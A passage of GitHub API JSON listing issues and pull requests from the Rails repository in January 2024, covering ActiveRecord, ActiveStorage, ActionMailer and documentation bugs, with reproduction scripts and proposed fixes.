            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-22T11:38:14Z",
        "updated_at": "2024-01-24T12:03:57Z",
        "closed_at": "2024-01-24T12:03:43Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50836",
            "html_url": "https://github.com/rails/rails/pull/50836",
            "diff_url": "https://github.com/rails/rails/pull/50836.diff",
            "patch_url": "https://github.com/rails/rails/pull/50836.patch",
            "merged_at": "2024-01-24T12:03:43Z"
        },
        "body": "RDoc can't extract the name of accessors defined with `singleton_class.attr_accessor`, resulting in methods called `unknown` in RDoc.\r\n\r\n## Before\r\n\r\n<img width=\"1033\" alt=\"image\" src=\"https://github.com/rails/rails/assets/28561/ef21546b-15de-41b6-94b8-f4b965b62fc0\">\r\n\r\nhttps://edgeapi.rubyonrails.org/classes/ActiveJob.html#method-c-unknown\r\n\r\n## After\r\n\r\n<img width=\"1010\" alt=\"image\" src=\"https://github.com/rails/rails/assets/28561/f749fb18-5818-4a87-8b7a-6269f2a45ba5\">\r\n\r\n### Additional Information\r\n\r\nIf the method can't be found RDoc will output a warning when the `verbose` option is set.\r\nI'd would be nice if this would raise an error instead.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50836/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50836/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50835",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50835/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50835/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50835/events",
        "html_url": "https://github.com/rails/rails/issues/50835",
        "id": 2093550361,
        "node_id": "I_kwDNIULOfMkLGQ",
        "number": 50835,
        "title": "ActiveStorage::FileNotFoundError (ActiveStorage::FileNotFoundError)",
        "user": {
            "login": "raoehtesham03",
            "id": 152256436,
            "node_id": "U_kgDOCRM_tA",
            "avatar_url": "https://avatars.githubusercontent.com/u/152256436?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/raoehtesham03",
            "html_url": "https://github.com/raoehtesham03",
            "followers_url": "https://api.github.com/users/raoehtesham03/followers",
            "following_url": "https://api.github.com/users/raoehtesham03/following{/other_user}",
            "gists_url": "https://api.github.com/users/raoehtesham03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/raoehtesham03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/raoehtesham03/subscriptions",
            "organizations_url": "https://api.github.com/users/raoehtesham03/orgs",
            "repos_url": "https://api.github.com/users/raoehtesham03/repos",
            "events_url": "https://api.github.com/users/raoehtesham03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/raoehtesham03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1071962662,
                "node_id": "MDU6TGFiZWwxMDcxOTYyNjYy",
                "url": "https://api.github.com/repos/rails/rails/labels/more-information-needed",
                "name": "more-information-needed",
                "color": "bfdadc",
                "default": false,
                "description": "When reporter needs to provide more information"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-22T10:07:53Z",
        "updated_at": "2024-02-06T14:15:51Z",
        "closed_at": "2024-02-06T14:15:50Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nI have upgraded my rails application from 6.0 to 6.1 . Since then when I am  executing below queries\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n d = Document.find(768365)\r\n d.page_image.variant(resize_to_limit: Document::PAGE_IMAGE_STYLES[:small]).processed\r\n\r\n```\r\nI am getting this error\r\n### Actual behavior\r\n  ActiveStorage::FileNotFoundError (ActiveStorage::FileNotFoundError)\r\n\r\n### System configuration\r\n**Rails version**: 7.0.8\r\n\r\n**Ruby version**: 3.0.6\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50835/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50835/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50833",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50833/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50833/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50833/events",
        "html_url": "https://github.com/rails/rails/issues/50833",
        "id": 2092932851,
        "node_id": "I_kwDNIULOfL-e8w",
        "number": 50833,
        "title": "`ActiveRecord::Migration[7.0]`'s `rename_table` uses 7.1's new truncated index name format",
        "user": {
            "login": "r7kamura",
            "id": 111689,
            "node_id": "MDQ6VXNlcjExMTY4OQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/111689?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/r7kamura",
            "html_url": "https://github.com/r7kamura",
            "followers_url": "https://api.github.com/users/r7kamura/followers",
            "following_url": "https://api.github.com/users/r7kamura/following{/other_user}",
            "gists_url": "https://api.github.com/users/r7kamura/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/r7kamura/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/r7kamura/subscriptions",
            "organizations_url": "https://api.github.com/users/r7kamura/orgs",
            "repos_url": "https://api.github.com/users/r7kamura/repos",
            "events_url": "https://api.github.com/users/r7kamura/events{/privacy}",
            "received_events_url": "https://api.github.com/users/r7kamura/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-22T02:09:26Z",
        "updated_at": "2024-01-23T03:17:22Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", \"7.1.3\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_index_name_after_rename_table_with_long_table_name\r\n    long_table_name = \"a\" * 48\r\n\r\n    migration_class = Class.new(ActiveRecord::Migration[7.0]) do\r\n      define_method :migrate do |x|\r\n        create_table :posts do |t|\r\n          t.string :title\r\n          t.index :title\r\n        end\r\n        rename_table :posts, long_table_name\r\n      end\r\n    end\r\n    migration = migration_class.new\r\n\r\n    ActiveRecord::Migrator.new(\r\n      :up,\r\n      [migration],\r\n      ActiveRecord::Base.connection.schema_migration,\r\n      ActiveRecord::Base.connection.internal_metadata\r\n    ).migrate\r\n\r\n    assert_equal \"index_#{long_table_name}_on_title\", ActiveRecord::Base.connection.indexes(long_table_name).first.name\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nThe above test should pass.\r\n\r\nThis means that since the index name was renamed to `index_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa_on_title` in Rails 7.0 and earlier, if `ActiveRecord::Migration[7.0]` or earlier is specified, the same name should be used even in Rails 7.1 or later.\r\n\r\n### Actual behavior\r\n\r\nThe above test fails with the following output:\r\n\r\n```\r\nF\r\n\r\nFailure:\r\nBugTest#test_index_name_after_rename_table_with_long_table_name [example.rb:53]:\r\n--- expected\r\n+++ actual\r\n@@ -1 +1 @@\r\n-\"index_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa_on_title\"\r\n+\"idx_on_title_0b3d36c24b\"\r\n\r\n\r\n\r\nbin/rails test example.rb:32\r\n\r\n\r\n\r\nFinished in 0.026827s, 37.2753 runs/s, 37.2753 assertions/s.\r\n1 runs, 1 assertions, 1 failures, 0 errors, 0 skips\r\n```\r\n\r\nAs a result, if db/migrate contains `rename_table`, the index names created between Rails 7.0 and 7.1 may be different.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: ruby 3.2.2 (2023-03-30 revision e51014f9c0) [x86_64-linux]\r\n\r\n### Other information\r\n\r\nThis is due to the following change:\r\n\r\n- https://github.com/rails/rails/pull/47753\r\n\r\nI think a similar change to the following is needed for `#rename_table`:\r\n\r\n- https://github.com/rails/rails/pull/47863\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50833/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50833/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50832",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50832/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50832/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50832/events",
        "html_url": "https://github.com/rails/rails/pull/50832",
        "id": 2092924497,
        "node_id": "PR_kwDNIULOZKtAsA",
        "number": 50832,
        "title": "Add new exception when attempting to connect to MySQL running on localhost.",
        "user": {
            "login": "ruyrocha",
            "id": 108208,
            "node_id": "MDQ6VXNlcjEwODIwOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/108208?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ruyrocha",
            "html_url": "https://github.com/ruyrocha",
            "followers_url": "https://api.github.com/users/ruyrocha/followers",
            "following_url": "https://api.github.com/users/ruyrocha/following{/other_user}",
            "gists_url": "https://api.github.com/users/ruyrocha/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ruyrocha/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ruyrocha/subscriptions",
            "organizations_url": "https://api.github.com/users/ruyrocha/orgs",
            "repos_url": "https://api.github.com/users/ruyrocha/repos",
            "events_url": "https://api.github.com/users/ruyrocha/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ruyrocha/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-22T01:58:18Z",
        "updated_at": "2024-01-30T20:15:33Z",
        "closed_at": "2024-01-30T18:54:15Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50832",
            "html_url": "https://github.com/rails/rails/pull/50832",
            "diff_url": "https://github.com/rails/rails/pull/50832.diff",
            "patch_url": "https://github.com/rails/rails/pull/50832.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created to address #50824.\r\n\r\n when there is a MySQL server running on localhost, and the gem translates the hostname to a socket.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the raised exception while attempting to connect to a MySQL server running on localhost, which is the case for a container running on local machine on default port.\r\n\r\nTurns out the MySQL client library translates the hostname `localhost` to a socket, but there is the server up and running.\r\n\r\n### Additional information\r\n\r\nThe new exception instructs you to use the IP address instead of the hostname when using the MySQL adapter.\r\n\r\nFYI, it doesn't happen when using Trilogy as the adapter to connect to MySQL servers.\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50832/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50832/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50831",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50831/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50831/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50831/events",
        "html_url": "https://github.com/rails/rails/issues/50831",
        "id": 2092651926,
        "node_id": "I_kwDNIULOfLtVlg",
        "number": 50831,
        "title": "Rails logs error messages with huge stack trace that I can't silence",
        "user": {
            "login": "bcowell",
            "id": 10282189,
            "node_id": "MDQ6VXNlcjEwMjgyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/10282189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bcowell",
            "html_url": "https://github.com/bcowell",
            "followers_url": "https://api.github.com/users/bcowell/followers",
            "following_url": "https://api.github.com/users/bcowell/following{/other_user}",
            "gists_url": "https://api.github.com/users/bcowell/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bcowell/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bcowell/subscriptions",
            "organizations_url": "https://api.github.com/users/bcowell/orgs",
            "repos_url": "https://api.github.com/users/bcowell/repos",
            "events_url": "https://api.github.com/users/bcowell/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bcowell/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-21T16:10:43Z",
        "updated_at": "2024-01-22T12:07:32Z",
        "closed_at": "2024-01-22T12:07:32Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "\r\nEvery time I have a runtime error running either the rails server or tests my error logs include a massive stack trace that I haven't been able to silence.\r\n\r\n[Gist of example development.log](https://gist.github.com/bcowell/b48ab2e820f474e3130e8bd2f3f6c140)\r\n\r\n### Steps to reproduce\r\n1. Run `rails s`\r\n2. Edit any line in a method to have invalid ruby\r\n3. Save the file and execute so it runs the method/test\r\n> My console fills with the massive stack trace\r\n\r\n### Expected behavior\r\nI expect an error message to include a reasonable stack trace with a few lines.\r\n\r\n### Actual behavior\r\nStack trace on every error is roughly 10k lines...\r\n\r\n### System configuration\r\nMacBook Pro 2019 Intel \r\nmacOS 13.3.1\r\n\r\n**Rails version**:\r\n6.1.7.6\r\n**Ruby version**:\r\n5.0.2",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50831/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50831/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50830",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50830/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50830/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50830/events",
        "html_url": "https://github.com/rails/rails/issues/50830",
        "id": 2092565763,
        "node_id": "I_kwDNIULOfLoFAw",
        "number": 50830,
        "title": "Add support for `ActionMailer.*_delivery` callback `only` and `except` options",
        "user": {
            "login": "viralpraxis",
            "id": 39729785,
            "node_id": "MDQ6VXNlcjM5NzI5Nzg1",
            "avatar_url": "https://avatars.githubusercontent.com/u/39729785?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/viralpraxis",
            "html_url": "https://github.com/viralpraxis",
            "followers_url": "https://api.github.com/users/viralpraxis/followers",
            "following_url": "https://api.github.com/users/viralpraxis/following{/other_user}",
            "gists_url": "https://api.github.com/users/viralpraxis/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/viralpraxis/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/viralpraxis/subscriptions",
            "organizations_url": "https://api.github.com/users/viralpraxis/orgs",
            "repos_url": "https://api.github.com/users/viralpraxis/repos",
            "events_url": "https://api.github.com/users/viralpraxis/events{/privacy}",
            "received_events_url": "https://api.github.com/users/viralpraxis/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-21T12:31:43Z",
        "updated_at": "2024-01-21T18:59:17Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nCurrently ActionMailer's `*_delivery` callbacks do not support `only` and `except` filters, which are quite useful because some callback actions are required for a subset of mailer methods. Technically, only/except can be emulated via `if` option, but another problem is that's not clear from the documentation which options can be passed (currently `only` and `except` are simply ignored).\r\n\r\nI believe that many developers might except `ActionMailer` to behave just like `ActionController`,  so current API implementation might lead to unexpected bugs.\r\n\r\nNote that documentation on `before_action` (and similar callbacks) explicitly refer to possible options:\r\n\r\n> before_action(names, block)[Link](https://api.rubyonrails.org/v7.1.3/classes/AbstractController/Callbacks/ClassMethods.html#method-i-before_action)\r\n> Append a callback before actions. See [_insert_callbacks](https://api.rubyonrails.org/v7.1.3/classes/AbstractController/Callbacks/ClassMethods.html#method-i-_insert_callbacks) for parameter details.\r\n\r\n### Expected behavior\r\nAt least some explicit info on possible `*_delivery` callback options, or (which would be better) support for `only` and `except` options.\r\n\r\n### Actual behavior\r\nMentioned options are simply ignored, no documentation on possible options.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.0.6\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50830/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50830/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50829",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50829/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50829/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50829/events",
        "html_url": "https://github.com/rails/rails/pull/50829",
        "id": 2092440404,
        "node_id": "PR_kwDNIULOZKUusw",
        "number": 50829,
        "title": "Fix query references for non-hash association where clause values",
        "user": {
            "login": "ezekg",
            "id": 6979737,
            "node_id": "MDQ6VXNlcjY5Nzk3Mzc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6979737?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ezekg",
            "html_url": "https://github.com/ezekg",
            "followers_url": "https://api.github.com/users/ezekg/followers",
            "following_url": "https://api.github.com/users/ezekg/following{/other_user}",
            "gists_url": "https://api.github.com/users/ezekg/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ezekg/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ezekg/subscriptions",
            "organizations_url": "https://api.github.com/users/ezekg/orgs",
            "repos_url": "https://api.github.com/users/ezekg/repos",
            "events_url": "https://api.github.com/users/ezekg/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ezekg/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-21T06:11:40Z",
        "updated_at": "2024-01-30T22:33:07Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50829",
            "html_url": "https://github.com/rails/rails/pull/50829",
            "diff_url": "https://github.com/rails/rails/pull/50829.diff",
            "patch_url": "https://github.com/rails/rails/pull/50829.patch",
            "merged_at": null
        },
        "body": "### Detail\r\n\r\nThis PR fixes an issue where non-hash where-clause values for associations would not set `references_values`. This could (and often does) end up causing hard-to-debug SQL errors due to association name vs table name mismatch, e.g. querying on a singular association name while the actual join table is plural, or vice-versa due to a prior scope.\r\n\r\nMore detailed reproduction script:  https://gist.github.com/ezekg/5969735eb8c5092fb25198bd8fac4053\r\n\r\n#### Before\r\n\r\n```rb\r\nscope = Comment.where(post: { id: post })\r\nscope.references_values # => [\"post\"]\r\n\r\nscope = Comment.where(post: post)\r\nscope.references_values # => []\r\n```\r\n\r\nI'd expect these to be synonymous since [`#id` is called on `post`](https://github.com/ezekg/rails/blob/c37450b76b24cac7951032c4210db17a9c1b7f51/activerecord/lib/active_record/relation/predicate_builder.rb#L58) for the second case.\r\n\r\n#### After\r\n\r\n```rb\r\nscope = Comment.where(post: { id: post })\r\nscope.references_values # => [\"post\"]\r\n\r\nscope = Comment.where(post: post)\r\nscope.references_values # => [\"post\"]\r\n```\r\n\r\nWith this patch, they're now more or less synonymous, both setting `references_values`.\r\n\r\nSince this is likely a breaking change (it broke a few tests in [keygen-sh/keygen-api](https://github.com/keygen-sh/keygen-api) when testing against the patch), this may require some more thought. But it is worth noting that all broken tests were related to various workarounds for this particular bug.\r\n\r\nLet me know what you guys think is the best course of action here.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50829/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50829/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50828",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50828/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50828/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50828/events",
        "html_url": "https://github.com/rails/rails/pull/50828",
        "id": 2092434369,
        "node_id": "PR_kwDNIULOZKUcQg",
        "number": 50828,
        "title": "Add examples for form helper tags [ci skip]",
        "user": {
            "login": "akhilgkrishnan",
            "id": 22231095,
            "node_id": "MDQ6VXNlcjIyMjMxMDk1",
            "avatar_url": "https://avatars.githubusercontent.com/u/22231095?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/akhilgkrishnan",
            "html_url": "https://github.com/akhilgkrishnan",
            "followers_url": "https://api.github.com/users/akhilgkrishnan/followers",
            "following_url": "https://api.github.com/users/akhilgkrishnan/following{/other_user}",
            "gists_url": "https://api.github.com/users/akhilgkrishnan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/akhilgkrishnan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/akhilgkrishnan/subscriptions",
            "organizations_url": "https://api.github.com/users/akhilgkrishnan/orgs",
            "repos_url": "https://api.github.com/users/akhilgkrishnan/repos",
            "events_url": "https://api.github.com/users/akhilgkrishnan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/akhilgkrishnan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-21T05:48:04Z",
        "updated_at": "2024-02-19T16:44:17Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50828",
            "html_url": "https://github.com/rails/rails/pull/50828",
            "diff_url": "https://github.com/rails/rails/pull/50828.diff",
            "patch_url": "https://github.com/rails/rails/pull/50828.patch",
            "merged_at": null
        },
